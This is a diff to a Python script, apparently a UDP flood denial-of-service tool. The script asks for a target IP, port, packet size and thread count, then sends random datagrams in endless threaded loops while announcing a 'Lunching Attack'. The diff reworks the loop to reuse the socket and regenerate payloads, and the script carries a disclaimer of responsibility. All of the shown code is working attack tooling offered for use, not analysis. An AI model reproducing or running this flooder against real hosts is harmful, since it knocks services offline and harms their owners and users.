@@ -44,26 +44,24 @@ Using Too much Bytes can slow down internet speed depending on your internet con
 **\33[1mI Am Not Responsible For Any Of Your Actions\33[0m\33[32m**
 =======================================
 """)
-
 byteSize = int(input("\33[33mByte size=>"))
-bytes = random._urandom(byteSize)
 ip = input("\33[31mIP=> ")
 port = int(input("\33[34mport=> "))
 num = input("(  Threads  )\33[35m=> \33[91m")
 tme = int(input("\33[94m Thread Delay (0-5 most Effective) (  Seconds  )=>"))
-
 print('\x1bc')
-print("\33[0;0H")
+print("\33[0;20H")
 print(Hydra)
-print ("\33[91m \33[104m  Lunching Attack on "+str(ip)+" Port="+ str(port)+ " Threads="+str(num)+" \33[104m\33[0m")
+print ("\33[91m\33[104m Lunching Attack on "+str(ip)+" Port="+ str(port)+" Bytes="+str(byteSize)+" Threads="+str(num)+" \33[104m\33[0m")
 def dos():
     sent = 0
-    while True:
-        	connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        	connect.sendto(bytes, (ip, port))
-        	sent = sent+1
-        	print("\r\33[42m Bytes="+str(sent), sep="",end='\33[0m', flush=True)        	
-        	
+    connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    if connect:
+        	while True:
+        		bytes = random._urandom(byteSize)
+        		connect.sendto((bytes), (ip, port))
+        		sent = sent+1
+        		print("\r\33[42m Bytes="+str(sent), sep="",end='\33[0m', flush=True)
 for i in range(int(num)):
 	time.sleep(tme)
 	print("\r\33[42m				Threads Activated="+str(i+1), end="\33[0m ", flush=True)
